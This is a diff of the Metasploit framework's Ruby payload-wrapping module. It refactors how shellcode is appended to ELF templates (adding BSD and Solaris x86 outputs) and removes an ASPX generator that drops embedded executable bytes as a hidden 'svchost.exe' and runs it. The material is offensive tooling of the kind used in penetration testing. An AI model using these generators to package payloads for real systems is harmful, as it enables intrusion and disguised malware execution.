@@ -1,5 +1,5 @@
 ##
-# $Id$
+# $Id:$
 ##
 
 ###
@@ -82,6 +82,14 @@ require 'digest/sha1'
 
 			if(plat.index(Msf::Module::Platform::OSX))
 				return to_osx_x86_macho(framework, code)
+			end
+
+			if(plat.index(Msf::Module::Platform::BSD))
+				return to_bsd_x86_elf(framework, code)
+			end
+
+			if(plat.index(Msf::Module::Platform::Solaris))
+				return to_solaris_x86_elf(framework, code)
 			end
 
 			# XXX: Add remaining x86 systems here
@@ -595,42 +603,17 @@ require 'digest/sha1'
 		return macho
 	end
 
-	#
-	# Create a 64-bit Linux ELF containing the payload provided in +code+
-	#
-	def self.to_linux_x64_elf(framework, code, opts={})
-		set_template_default(opts, "template_x64_linux.bin")
-
-		elf = ''
-		File.open(opts[:template], "rb") { |fd|
-			elf = fd.read(fd.stat.size)
-		}
-
-		#Append shellcode
-		elf << code
-
-		#Modify size
-		elf[96, 8] = [120 + code.length].pack('Q')  #p_filesz
-		elf[104,8] = [120 + code.length].pack('Q')  #p_memsz
-
-		return elf
-	end
-
-	#
-	# Create a 32-bit Linux ELF containing the payload provided in +code+
-	#
-	# For the default template, this method just appends the payload.  For
-	# user-provided templates, modifies the header to mark all executable
+	# Create an ELF executable containing the payload provided in +code+
+	# For the default template, this method just appends the payload, checks if 
+	# the template is 32 or 64 bit and adjusts the offsets accordingly
+	# For user-provided templates, modifies the header to mark all executable
 	# segments as writable and overwrites the entrypoint (usually _start) with
 	# the payload.
 	#
-	def self.to_linux_x86_elf(framework, code, opts={})
-		unless opts[:template]
-			default = true
-		end
+	def self.to_exe_elf(opts, template, code)
 
 		# Allow the user to specify their own template
-		set_template_default(opts, "template_x86_linux.bin")
+		set_template_default(opts, template)
 
 		# The old way to do it is like other formats, just overwrite a big
 		# block of rwx mem with our shellcode.
@@ -638,18 +621,39 @@ require 'digest/sha1'
 		#co = elf.index( " " * 512 )
 		#elf[bo, 2048] = [code].pack('a2048') if bo
 
-		if default
-			# The new template is just an ELF header with its entry point set to
-			# the end of the file, so just append shellcode to it and fixup
-			# p_filesz and p_memsz in the header for a working ELF executable.
-			elf = ''
-			File.open(opts[:template], "rb") { |fd|
-				elf = fd.read(fd.stat.size)
-			}
+		# The new template is just an ELF header with its entry point set to
+		# the end of the file, so just append shellcode to it and fixup
+		# p_filesz and p_memsz in the header for a working ELF executable.
+		elf = ''
+		File.open(opts[:template], "rb") { |fd|
+			elf = fd.read(fd.stat.size)
+		}
 
-			elf << code
-			elf[0x44,4] = [elf.length + code.length].pack('V')
-			elf[0x48,4] = [elf.length + code.length].pack('V')
+		elf << code
+
+		# Check EI_CLASS to determine if the header is 32 or 64 bit
+		# Use the proper offsets and pack size
+		if    elf[4] == "\x01" # ELFCLASS32 - 32 bit
+			elf[0x44,4] = [elf.length].pack('V')  #p_filesz
+			elf[0x48,4] = [elf.length].pack('V')  #p_memsz
+		elsif elf[4] == "\x02" # ELFCLASS64 - 64 bit
+			elf[0x60,8] = [elf.length].pack('Q')  #p_filesz
+			elf[0x68,8] = [elf.length].pack('Q')  #p_memsz
+		else
+			raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported" 
+		end
+
+		return elf
+	end
+
+	# Create a 32-bit Linux ELF containing the payload provided in +code+
+	def self.to_linux_x86_elf(framework, code, opts={})
+		unless opts[:template]
+			default = true
+		end
+
+		if default
+			elf = to_exe_elf(opts, "template_x86_linux.bin", code)
 		else
 			# If this isn't our normal template, we have to do some fancy
 			# header patching to mark the .text section rwx before putting our
@@ -684,23 +688,26 @@ require 'digest/sha1'
 		return elf
 	end
 
+	# Create a 32-bit BSD (test on FreeBSD) ELF containing the payload provided in +code+
+	def self.to_bsd_x86_elf(framework, code, opts={})
+		elf = to_exe_elf(opts, "template_x86_bsd.bin", code)
+		return elf
+	end
+
+	# Create a 32-bit Solaris ELF containing the payload provided in +code+
+	def self.to_solaris_x86_elf(framework, code, opts={})
+		elf = to_exe_elf(opts, "template_x86_solaris.bin", code)
+		return elf
+	end
+
+	# Create a 64-bit Linux ELF containing the payload provided in +code+
+	def self.to_linux_x64_elf(framework, code, opts={})
+		elf = to_exe_elf(opts, "template_x64_linux.bin", code)
+		return elf
+	end
+
 	def self.to_linux_armle_elf(framework, code, opts={})
-
-		# Allow the user to specify their own template
-		set_template_default(opts, "template_armle_linux.bin")
-
-		elf = ''
-		File.open(opts[:template], "rb") { |fd|
-			elf = fd.read(fd.stat.size)
-		}
-
-		# The template is just an ELF header with its entrypoint set to the
-		# end of the file, so just append shellcode to it and fixup p_filesz
-		# and p_memsz in the header for a working ELF executable.
-		elf << code
-		elf[0x44,4] = [elf.length + code.length].pack('V')
-		elf[0x48,4] = [elf.length + code.length].pack('V')
-
+		elf = to_exe_elf(opts, "template_armle_linux.bin", code)
 		return elf
 	end
 
@@ -1011,64 +1018,6 @@ End Sub
 		vbs << "%>\r\n"
 		vbs
 	end
-	
-	def self.to_exe_aspx(exes = '', opts={})
-		exe = exes.unpack('C*')
-
-		var_file = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_filename = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_iterator = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_proc = Rex::Text.rand_text_alpha(rand(8)+8)
-
-		source = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\r\n"
-		source << "<%@ Import Namespace=\"System.IO\" %>\r\n"
-		source << "<script runat=\"server\">\r\n"
-		source << "\tprotected void Page_Load(object sender, EventArgs e)\r\n"
-		source << "\t{\r\n"
-		source << "\t\tStringBuilder #{var_file} = new StringBuilder();\r\n"
-		source << "\t\t#{var_file}.Append(\"\\x#{exe[0].to_s(16)}"
-
-		1.upto(exe.length-1) do |byte|
-				# Apparently .net 1.0 has a limit of 2046 chars per line
-				if(byte % 100 == 0)
-						source << "\");\r\n\t\t#{var_file}.Append(\""
-				end
-				source << "\\x#{exe[byte].to_s(16)}"
-		end
-
-		source << "\");\r\n"
-		source << "\t\tstring #{var_tempdir} = Path.GetTempPath();\r\n"
-		source << "\t\tstring #{var_basedir} = Path.Combine(#{var_tempdir}, \"#{var_filename}\");\r\n"
-		source << "\t\tstring #{var_tempexe} = Path.Combine(#{var_basedir}, \"svchost.exe\");\r\n"
-		source << "\r\n"
-		source << "\t\tDirectory.CreateDirectory(#{var_basedir});\r\n"
-		source << "\r\n"
-		source << "\t\tFileStream fs = File.Create(#{var_tempexe});\r\n"
-		source << "\t\ttry\r\n"
-		source << "\t\t{\r\n"
-		source << "\t\t\tforeach (char #{var_iterator} in #{var_file}.ToString())\r\n"
-		source << "\t\t\t{\r\n"
-		source << "\t\t\t\tfs.WriteByte(Convert.ToByte(#{var_iterator}));\r\n"
-		source << "\t\t\t}\r\n"
-		source << "\t\t}\r\n"
-		source << "\t\tfinally\r\n"
-		source << "\t\t{\r\n"
-		source << "\t\t\tif (fs != null) ((IDisposable)fs).Dispose();\r\n"
-		source << "\t\t}\r\n"
-		source << "\r\n"
-		source << "\t\tSystem.Diagnostics.Process #{var_proc} = new System.Diagnostics.Process();\r\n"
-		source << "\t\t#{var_proc}.StartInfo.CreateNoWindow = true;\r\n"
-		source << "\t\t#{var_proc}.StartInfo.UseShellExecute = true;\r\n"
-		source << "\t\t#{var_proc}.StartInfo.FileName = #{var_tempexe};\r\n"
-		source << "\t\t#{var_proc}.Start();\r\n"
-		source << "\r\n"
-		source << "\t}\r\n"
-		source << "</script>\r\n"
-		source
-	end
 
 	def self.to_win32pe_vbs(framework, code, opts={})
 		to_exe_vbs(to_win32pe(framework, code, opts), opts)
@@ -1076,10 +1025,6 @@ End Sub
 
 	def self.to_win32pe_asp(framework, code, opts={})
 		to_exe_asp(to_win32pe(framework, code, opts), opts)
-	end
-	
-	def self.to_win32pe_aspx(framework, code, opts={})
-		to_exe_aspx(to_win32pe(framework, code, opts), opts)
 	end
 
 	# Creates a jar file that drops the provided +exe+ into a random file name
@@ -1806,9 +1751,6 @@ End Sub
 		when 'asp'
 			output = Msf::Util::EXE.to_win32pe_asp(framework, code, exeopts)
 
-		when 'aspx'
-			output = Msf::Util::EXE.to_win32pe_aspx(framework, code, exeopts)
-			
 		when 'war'
 			arch ||= [ ARCH_X86 ]
 			tmp_plat = plat.platforms if plat
@@ -1822,7 +1764,7 @@ End Sub
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war']
+		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','war']
 	end
 
 	#
